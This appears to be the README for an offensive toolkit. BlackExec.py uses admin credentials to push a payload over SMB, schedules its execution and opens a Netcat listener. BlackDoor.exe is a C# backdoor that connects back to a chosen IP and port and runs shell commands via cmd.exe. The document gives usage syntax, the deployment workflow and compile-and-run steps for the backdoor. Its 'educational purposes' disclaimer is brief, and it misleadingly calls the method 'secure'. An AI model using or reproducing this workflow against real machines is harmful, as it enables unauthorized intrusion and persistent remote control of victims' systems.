# **BlackExec Script Documentation**

## **Introduction**

BlackExec.py is designed to facilitate the deployment of a payload onto a remote machine using the SMB (Server Message Block) protocol. It establishes an SMB connection, uploads the payload to a specified SMB share, and then schedules a task on the remote machine to execute the payload. The script provides options for local and remote connections, allowing flexibility in configuring the payload deployment process.

## **Dependencies**

The script relies on the following dependencies:

- **`smbclient`**: A Python library for interacting with SMB/CIFS shares.
- **`subprocess`**: A module for spawning new processes, used to execute shell commands.
- **`datetime`**: A module for manipulating dates and times.
- **`argparse`**: A module for parsing command-line arguments.
- **`socket`**: A module for working with network sockets.
- **`threading`**: A module for creating and managing threads.
- **`random`**: A module for generating random numbers.

Ensure that these dependencies are installed before running the script.

## **Script Functions**

The script includes several functions to facilitate the payload deployment process. The following are the main functions:

- **`netcat_thread(port)`**: Spawns a new command prompt window and starts the Netcat listener on the specified port. Used for local connections where the payload will connect back to the script's host machine.
- **`run_command(command)`**: Executes a shell command using the **`subprocess`** module.
- **`main(ip=None, username=None, password=None, local=False, remote=False)`**: Orchestrates the payload deployment process. Establishes an SMB connection, uploads the payload to the remote machine, schedules a task to execute the payload, and connects to the payload listener.

## **Usage**

The script can be executed from the command line with the following options:

```
python blackexec.py [-u USERNAME] [-p PASSWORD] [-ip IP_ADDR] [-local] [-remote IP]
```

The command-line arguments are as follows:

- **`u USERNAME, --username USERNAME`**: The admin username for the remote machine.
- **`p PASSWORD, --password PASSWORD`**: The admin password for the remote machine.
- **`ip IP_ADDR, --ip_addr IP_ADDR`**: The IP address of the remote machine.
- **`local, --local_ip`**: Option to create a connection to the local machine.
- **`remote REMOTE_IP, --remote_ip REMOTE_IP`**: Option to send a connection to a remote machine (default port: 2001). An optional parameter **`REMOTE_IP`** can be provided to specify the remote machine's IP address. If not specified, the default port 2001 will be used.

Ensure that the required arguments are provided when running the script.

## **Workflow**

The script follows the following workflow:

1. Establish an SMB connection using the provided username and password.
2. Upload the payload to the specified SMB share on the remote machine.
3. Schedule a task to execute the payload.
4. Connect to the payload listener either locally or remotely.

The script handles both local and remote connections. For local connections, it spawns a Netcat listener on a random port. For remote connections, it specifies the IP address and port for the payload listener.

# **Payload**

BlackDoor.exe is a payload designed to establish a TCP connection to a remote machine and execute shell commands on that machine. It acts as a backdoor, providing remote access and control over the target system. The payload is implemented in C# and can be compiled into an executable file for deployment.

To use BlackDoor.exe, follow these steps:

1. Compile the C# code into an executable using a C# compiler or an integrated development environment (IDE) such as Visual Studio.
2. Execute the compiled BlackDoor.exe file with the following command-line arguments:Replace **`<IP_ADDRESS>`** with the IP address of the machine where the payload should connect, and **`<PORT>`** with the port number on which the payload should establish the TCP connection.
    
    ```
    BlackDoor.exe <IP_ADDRESS> <PORT>
    ```
    

## **Dependencies**

BlackDoor.exe does not have any external dependencies. It utilizes the core functionality of the .NET Framework and the C# programming language.

## **Functionality**

BlackDoor.exe provides the following functionality:

- Establishes a TCP connection to the specified IP address and port.
- Executes shell commands on the remote machine.
- Sends the output of the executed command back to the client machine.
- Supports continuous command execution until terminated.

## **Command Execution**

Once the BlackDoor.exe payload is executed on the target machine, it enters into a loop where it waits for commands from the client machine. Upon receiving a command, it executes the command using the Windows command prompt (**`cmd.exe`**). The output of the executed command is then sent back to the client machine.

## **Security Considerations**

When deploying the BlackExec.py, it is crucial to consider security implications. The payload grants remote access to the target machine, which can be misused if not handled properly. Ensure that the payload is deployed and used only in authorized and controlled environments. Implement appropriate security measures, such as network segmentation and access controls, to prevent unauthorized access to the payload.

**Note:** The BlackDoor.exe payload is provided for educational and informational purposes only. It should be used responsibly and ethically, and with the explicit permission of the target machine's owner.

## **Conclusion**

BlackExec script simplifies the process of deploying a payload onto a remote machine. By leveraging the SMB protocol, it provides a secure and efficient method for uploading and executing the payload. The script's flexibility allows for different deployment scenarios, whether connecting to the local machine or sending connections to remote machines.
